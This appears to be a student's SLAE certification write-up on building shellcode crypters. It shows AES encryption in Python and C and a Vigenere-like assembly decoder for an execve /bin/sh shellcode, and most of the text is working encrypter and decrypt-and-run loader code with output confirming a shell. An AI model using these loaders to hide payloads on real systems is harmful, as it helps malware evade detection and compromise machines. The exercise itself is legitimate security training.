# Note

This MD file has been created for the SecurityTube Linux Assembly Expert certification (https://www.pentesteracademy.com/course?id=3). Student ID: 1483.

# Get execve shellcode

Just to get sure, let's compile the execve-stack shellcode and extract it:

```
cervoise@slae:~$ bash compile.sh execve-stack
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
cervoise@slae:~$ ./execve-stack 
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
cervoise@slae:~$ bash get-shellcode.sh execve-stack
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
```

# Using AES in Python

All Python scripts I did in this course were in Python 3 (especially because of the end of life of Python 2). As this is the final exercise and Python 2 is living its last days, let's do this in Python 2.

First, we need to be able to load a shellcode in Python 2. A blog post from 2015 gives this script using *ctype*: http://hacktracking.blogspot.com/2015/05/execute-shellcode-in-python.html.

I decided to choose AES. The Simple-AES-Cipher (https://pypi.org/project/Simple-AES-Cipher) is a small Python library based on Python Crypto. Using the example code a crypter can be easily written. Shellcode must be a multiple of 16 bytes, NOP (0x90) are added as padding.

```python
import base64
import simple_aes_cipher

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

if len(shellcode) % 16 != 0:
   for i in range(16 - len(shellcode) % 16 - 1):
      shellcode += "\x90"
pass_phrase = "security-tube-slae1483"
secret_key = simple_aes_cipher.generate_secret_key(pass_phrase)
cipher = simple_aes_cipher.AESCipher(secret_key)

encrypt_text = cipher.encrypt(shellcode)
encrypted_shellcode = ""
for elmt in bytearray(base64.b64decode(encrypt_text)):
   encrypted_shellcode += '\\x' 
   encrypted_shellcode += '%02x' % elmt

print(encrypted_shellcode)

decrypt_text = cipher.decrypt(encrypt_text)
decrypted_shellcode = ""
for elmt in bytearray(decrypt_text):
   decrypted_shellcode += '\\x' 
   decrypted_shellcode += '%02x' % elmt

print(decrypted_shellcode)
```

```
$ python aes-encoder-example.py 
\x35\x27\x94\x2e\xdb\xdb\x85\x6f\x10\x6c\x9d\x7c\x65\x1f\xc4\x4d\x98\xc3\x9e\xb7\x23\xa4\x20\x85\xa5\x4d\xc2\x35\x75\x93\x45\x71\x0a\xd9\x3d\x76\x0b\xed\xe9\x89\x79\xa8\x55\xe3\x4e\xc1\xdb\xd3
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90
```

From this an encrypter can be easily done:

```python
import base64
import sys

import simple_aes_cipher

if len(sys.argv) != 3:
   print("Usage: " + sys.argv[0] + " shellcode key")

shellcode = sys.argv[1].replace('\\x', '').decode('hex')

if len(shellcode) % 16 != 0:
   for i in range(16 - len(shellcode) % 16 - 1):
      shellcode += "\x90"
pass_phrase = sys.argv[2]

secret_key = simple_aes_cipher.generate_secret_key(pass_phrase)
cipher = simple_aes_cipher.AESCipher(secret_key)

encrypt_text = cipher.encrypt(shellcode)
encrypted_shellcode = ""
for elmt in bytearray(base64.b64decode(encrypt_text)):
   encrypted_shellcode += '\\x' 
   encrypted_shellcode += '%02x' % elmt

print(encrypted_shellcode)

```

```
$ python encrypter.py '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' security-tube-slae1483
\x40\x99\x24\x40\x0b\x22\xa0\x33\xdb\x89\x31\xbd\xd9\x1b\x9f\xfb\x90\xe4\xd0\xb2\x9d\xf8\xc1\x7b\x17\x99\x34\xe4\x03\x4a\x5b\x2d\x71\x9e\x6a\x60\x68\x03\xcb\xd7\x07\x80\x7d\x38\xc9\x57\xce\x62
```

And a decrypter with shellcode execution. Note, arguments are not passed through command line in order to reduce the amount of code for the final binary.

```python
from base64 import b64encode
import simple_aes_cipher
from ctypes import CDLL, c_char_p, c_void_p, memmove, cast, CFUNCTYPE

pass_phrase = "security-tube-slae1483"
secret_key = simple_aes_cipher.generate_secret_key(pass_phrase)
cipher = simple_aes_cipher.AESCipher(secret_key)

encrypted_shellcode = "\x40\x99\x24\x40\x0b\x22\xa0\x33\xdb\x89\x31\xbd\xd9\x1b\x9f\xfb\x90\xe4\xd0\xb2\x9d\xf8\xc1\x7b\x17\x99\x34\xe4\x03\x4a\x5b\x2d\x71\x9e\x6a\x60\x68\x03\xcb\xd7\x07\x80\x7d\x38\xc9\x57\xce\x62"
decrypt_text = cipher.decrypt(b64encode(encrypted_shellcode))

libc = CDLL('libc.so.6')

sc = c_char_p(decrypt_text)
size = len(decrypt_text)
addr = c_void_p(libc.valloc(size))
memmove(addr, sc, size)
libc.mprotect(addr, size, 0x7)
run = cast(addr, CFUNCTYPE(c_void_p))
run()
```

```
$ python decrypt-and-run.py 
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
```

Let's compile the all things into an ELF using PyInstaller:

```
cervoise@slae:~$ python pyinstaller.py --onefile ../decrypt-and-run.py 
[...]
cervoise@slae:~$ ls -hl ./decrypt-and-run/dist/decrypt-and-run-import 
-rwxr-xr-x 1 cervoise cervoise 3,8M dec.  27 21:56 ./decrypt-and-run/dist/decrypt-and-run-import
cervoise@slae:~$ ./decrypt-and-run/dist/decrypt-and-run-import 
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
```

This a pretty big program. Even if this could be reduced by removing unused code from libraries or by optimising import, as Python came with an interpreter, the final ELF will still stay very big (as a shellcode).

# Using AES in C

## tiny-AES-c

A smaller way is to use a compiled language as C. The following code is based on a AES library found on GitHub: https://github.com/kokke/tiny-AES-c.

Important point to notice is that *No padding is provided so for CBC and ECB all buffers should be multiple of 16 bytes.*

The code is based on the *test.c* file from *github*.

## Encrypter

Shellcode will be manually padded with NOP (0x90):

```C
    uint8_t shellcode[SHELLCODELENGTH] = { (uint8_t) 0x31, (uint8_t) 0xc0, (uint8_t) 0x50, (uint8_t) 0x68, (uint8_t) 0x2f, (uint8_t) 0x2f, (uint8_t) 0x6c, (uint8_t) 0x73, (uint8_t) 0x68, (uint8_t) 0x2f, (uint8_t) 0x62, (uint8_t) 0x69, (uint8_t) 0x6e, (uint8_t) 0x89, (uint8_t) 0xe3, (uint8_t) 0x50, (uint8_t) 0x89, (uint8_t) 0xe2, (uint8_t) 0x53, (uint8_t) 0x89, (uint8_t) 0xe1, (uint8_t) 0xb0, (uint8_t) 0xb, (uint8_t) 0xcd, (uint8_t) 0x80, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90 };
``` 

Key will be: securitytubeSLAE

```C
    uint8_t key[16] =        { (uint8_t) 0x73, (uint8_t) 0x65, (uint8_t) 0x63, (uint8_t) 0x75, (uint8_t) 0x72, (uint8_t) 0x69, (uint8_t) 0x74, (uint8_t) 0x79, (uint8_t) 0x74, (uint8_t) 0x75, (uint8_t) 0x62, (uint8_t) 0x65, (uint8_t) 0x53, (uint8_t) 0x4c, (uint8_t) 0x41, (uint8_t) 0x45 };
``` 

The full encrypter code is :

```C
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "aes.h"

#define SHELLCODELENGTH 32

static void phex(uint8_t* str);

int main(void)
{ 
    uint8_t i;

    uint8_t key[16] =        { (uint8_t) 0x73, (uint8_t) 0x65, (uint8_t) 0x63, (uint8_t) 0x75, (uint8_t) 0x72, (uint8_t) 0x69, (uint8_t) 0x74, (uint8_t) 0x79, (uint8_t) 0x74, (uint8_t) 0x75, (uint8_t) 0x62, (uint8_t) 0x65, (uint8_t) 0x53, (uint8_t) 0x4c, (uint8_t) 0x41, (uint8_t) 0x45 };

    uint8_t shellcode[SHELLCODELENGTH] = { (uint8_t) 0x31, (uint8_t) 0xc0, (uint8_t) 0x50, (uint8_t) 0x68, (uint8_t) 0x2f, (uint8_t) 0x2f, (uint8_t) 0x73, (uint8_t) 0x68, (uint8_t) 0x68, (uint8_t) 0x2f, (uint8_t) 0x62, (uint8_t) 0x69, (uint8_t) 0x6e, (uint8_t) 0x89, (uint8_t) 0xe3, (uint8_t) 0x50, (uint8_t) 0x89, (uint8_t) 0xe2, (uint8_t) 0x53, (uint8_t) 0x89, (uint8_t) 0xe1, (uint8_t) 0xb0, (uint8_t) 0x0b, (uint8_t) 0xcd, (uint8_t) 0x80, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90, (uint8_t) 0x90 };

    printf("Encoded shellcode:\n");
    
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);

    for (i = 0; i < SHELLCODELENGTH / 16; ++i)
    {
      AES_ECB_encrypt(&ctx, shellcode + (i * 16));
      phex(shellcode + (i * 16));
    }

    return 0;
}

// prints string as hex
static void phex(uint8_t* str)
{
    unsigned char i;
    for (i = 0; i < 16; ++i)
        printf("(uint8_t) 0x%.2x, ", str[i]);
    printf("\n");
}
```
Compilation tricks can be set in order to reduce the size of the lib:

```
$ gcc -o aes.o aes.c -Wall -Os -c -DCBC=0 -DCTR=1 -DECB=1
$ gcc aes.h aes.o encrypter.c -o encrypter
$ ./encrypter 
Encoded shellcode:
(uint8_t) 0xfe, (uint8_t) 0x81, (uint8_t) 0x33, (uint8_t) 0x9e, (uint8_t) 0x8a, (uint8_t) 0x50, (uint8_t) 0x0d, (uint8_t) 0xb9, (uint8_t) 0xc0, (uint8_t) 0x9c, (uint8_t) 0x41, (uint8_t) 0xd4, (uint8_t) 0xbf, (uint8_t) 0xa0, (uint8_t) 0xb4, (uint8_t) 0x25, 
(uint8_t) 0x32, (uint8_t) 0x02, (uint8_t) 0x99, (uint8_t) 0xf5, (uint8_t) 0x01, (uint8_t) 0x02, (uint8_t) 0xf8, (uint8_t) 0x1b, (uint8_t) 0xfd, (uint8_t) 0x92, (uint8_t) 0xe7, (uint8_t) 0xf0, (uint8_t) 0x6b, (uint8_t) 0xf8, (uint8_t) 0x6b, (uint8_t) 0x63, 
```

## Decrypter

The same code can be used an combine with *shellcode.c* in order to decrypt and run the encoded shellcode.

```C
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#include "aes.h"

#define SHELLCODELENGTH 32

int main(void)
{
    uint8_t i;

    uint8_t key[16] =        { (uint8_t) 0x73, (uint8_t) 0x65, (uint8_t) 0x63, (uint8_t) 0x75, (uint8_t) 0x72, (uint8_t) 0x69, (uint8_t) 0x74, (uint8_t) 0x79, (uint8_t) 0x74, (uint8_t) 0x75, (uint8_t) 0x62, (uint8_t) 0x65, (uint8_t) 0x53, (uint8_t) 0x4c, (uint8_t) 0x41, (uint8_t) 0x45 };

    uint8_t shellcode[SHELLCODELENGTH] = { (uint8_t) 0xfe, (uint8_t) 0x81, (uint8_t) 0x33, (uint8_t) 0x9e, (uint8_t) 0x8a, (uint8_t) 0x50, (uint8_t) 0x0d, (uint8_t) 0xb9, (uint8_t) 0xc0, (uint8_t) 0x9c, (uint8_t) 0x41, (uint8_t) 0xd4, (uint8_t) 0xbf, (uint8_t) 0xa0, (uint8_t) 0xb4, (uint8_t) 0x25, (uint8_t) 0x32, (uint8_t) 0x02, (uint8_t) 0x99, (uint8_t) 0xf5, (uint8_t) 0x01, (uint8_t) 0x02, (uint8_t) 0xf8, (uint8_t) 0x1b, (uint8_t) 0xfd, (uint8_t) 0x92, (uint8_t) 0xe7, (uint8_t) 0xf0, (uint8_t) 0x6b, (uint8_t) 0xf8, (uint8_t) 0x6b, (uint8_t) 0x63 };
    struct AES_ctx ctx;
    AES_init_ctx(&ctx, key);

    for (i = 0; i < SHELLCODELENGTH / 16; ++i)
    {
      AES_ECB_decrypt(&ctx, shellcode + (i * 16));
    }

    int (*ret)() = (int(*)())shellcode;
    ret();

    return 0;
}
```

Let's check everything is working:

```
cervoise@slae:~/aes/C/tiny-AES-c$ gcc aes.h aes.o decrypt-and-run.c -o decrypt-and-run -fno-stack-protector -z execstack
cervoise@slae:~/aes/C/tiny-AES-c$ ls -hl decrypt-and-run
-rwxrwxr-x 1 cervoise cervoise 12K janv. 20 14:46 decrypt-and-run
cervoise@slae:~/aes/C/tiny-AES-c$ ./decrypt-and-run 
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit
```

## Conclusion

This code is smaller. It is even possible to remove null bytes using the Cesar encoder script from the encoder exercise. However, as this is a full ELF and not a shellcode, the execution flow does not start at the beginning of the code:

```
cervoise@slae:~/aes/C/tiny-AES-c$ readelf -h decrypt-and-run |grep "Entry"
  Entry point address:               0x80483b0
cervoise@slae:~/aes/C/tiny-AES-c$ objdump -d -M intel decrypt-and-run |head

decrypt-and-run:     file format elf32-i386


Disassembly of section .init:

0804831c <_init>:
 804831c: 53                    push   ebx
 804831d: 83 ec 08              sub    esp,0x8
 8048320: e8 00 00 00 00        call   8048325 <_init+0x9>
```

# Old encryption

An easiest way to do encryption is using old cryptography like Vigenere like algorythm.

## Crypter

First step is to code a crypter. For convenience, only a multiple of 4 will be used for key size.

```python
#!/usr/bin/python3

# Python Vigenere Like Encoder 

import sys

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
key = "SECURITY"
encryted = ""
encryted2 = ""

if len(key) % 4 != 0:
   print("Key length must be multiple of 4")
   sys.exit(0)

i = 0
for x in shellcode :
   # Vigenere Like
   y = ord(x) - ord(key[i])
   if y < 0:
      y = (y % 0xFF) + 1

   encryted += '\\x'
   encryted += '%02x' % y

   encryted2 += '0x'
   encryted2 += '%02x,' %y
   if i == 7:
      i = 0
   else:
      i += 1

print("ENCRYPTED SHELLCODE")
print(encryted)
print(encryted2[:-1])
print('Len: %d' % len(shellcode))
```

```bash
$ python3 VIGENEREEncrypter.py 
ENCRYPTED SHELLCODE
\xde\x7b\x0d\x13\xdd\xe6\x1f\x0f\x15\xea\x1f\x14\x1c\x40\x8f\xf7\x36\x9d\x10\x34\x8f\x67\xb7\x74\x2d
0xde,0x7b,0x0d,0x13,0xdd,0xe6,0x1f,0x0f,0x15,0xea,0x1f,0x14,0x1c,0x40,0x8f,0xf7,0x36,0x9d,0x10,0x34,0x8f,0x67,0xb7,0x74,0x2d
Len: 25
```

## Trivial decrypter

Using the xor decoder example from the course, a decrypter can easily be done by using each character from the key one by one. This method has the inconvenience to increase the decoder stub.

The important thing to keep in mind is to compile a ELF where the .text section is writable in order to test the shellcode.

```ASM
global _start

section .text
_start:
 jmp short call_decrypter

decrypter:
 pop esi
 xor ecx, ecx
 mov cl, 5 ; 35/8 = 4.375

decrypte:
 add byte [esi], 0x53
 inc esi
 add byte [esi], 0x45
 inc esi
 add byte [esi], 0x43
 inc esi
 add byte [esi], 0x55
 inc esi
 add byte [esi], 0x52
 inc esi
 add byte [esi], 0x49
 inc esi
 add byte [esi], 0x54
 inc esi
 add byte [esi], 0x59
 inc esi
 loop decrypte

 jmp short Shellcode


call_decrypter:
 call decrypter
 Shellcode: db 0xde,0x7b,0x0d,0x13,0xdd,0xe6,0x1f,0x0f,0x15,0xea,0x1f,0x14,0x1c,0x40,0x8f,0xf7,0x36,0x9d,0x10,0x34,0x8f,0x67,0xb7,0x74,0x2d
```

Let's test this shellcode

```
cervoise@slae:~$ nasm -f elf32 vigenere-decrypter-nonull.nasm
cervoise@slae:~$ ld -N -z execstack -o vigenere-decrypter-nonull vigenere-decrypter-nonull.o
cervoise@slae:~$ bash ~/exam/get-shellcode.sh vigenere-decrypter-nonull
"\xeb\x29\x5e\x31\xc9\xb1\x05\x80\x06\x53\x46\x80\x06\x45\x46\x80\x06\x43\x46\x80\x06\x55\x46\x80\x06\x52\x46\x80\x06\x49\x46\x80\x06\x54\x46\x80\x06\x59\x46\xe2\xde\xeb\x05\xe8\xd2\xff\xff\xff\xde\x7b\x0d\x13\xdd\xe6\x1f\x0f\x15\xea\x1f\x14\x1c\x40\x8f\xf7\x36\x9d\x10\x34\x8f\x67\xb7\x74\x2d"
cervoise@slae:~$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
cervoise@slae:~$ ./shellcode 
Shellcode Length:  73
$ id
uid=1000(cervoise) gid=1000(cervoise) groups=1000(cervoise),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
$ exit

```

## Smart decrypter

Another way could be to push the key on the stack in order to have the same shellcode length for any key length.  The following sample works easily:

```ASM
global _start

section .text
_start:

 xor eax, eax
 push eax
 push 0x59544952
 push 0x55434553
 mov eax, esp ;save KEY
 
 jmp short call_decrypter

decrypter:
 pop esi
 xor ecx, ecx
 mov cl, 25

restore_key:
 mov ebx, eax ;register used for decryption

decrypte:
 mov dl, byte [ebx]
 add byte [esi], dl
 inc esi
 inc ebx
        mov edx, ebx
 sub edx, eax
 sub dl, 8
 jz restore_key

 loop decrypte

 jmp short Shellcode


call_decrypter:
 call decrypter
 Shellcode: db 0xde,0x7b,0x0d,0x13,0xdd,0xe6,0x1f,0x0f,0x15,0xea,0x1f,0x14,0x1c,0x40,0x8f,0xf7,0x36,0x9d,0x10,0x34,0x8f,0x67,0xb7,0x74,0x2d
```
 However, theses ASM lines all contains null bytes:
 
 ```
00 46 01                add    BYTE PTR [esi+0x1],al
00 5e 01                add    BYTE PTR [esi+0x1],bl
00 4e 01                add    BYTE PTR [esi+0x1],cl
00 56 01                add    BYTE PTR [esi+0x1],dl
 ```

Another way could  be investigated but this could increase the size of the shellcode regarding the trivial version.

# Alternatives

RC4 or XTEA  are easy algorithms to code in assembly, examples can be found https://github.com/aelfimow/rc4-asm or https://tinycrypt.wordpress.com/2018/01/24/xtea-block-cipher/.
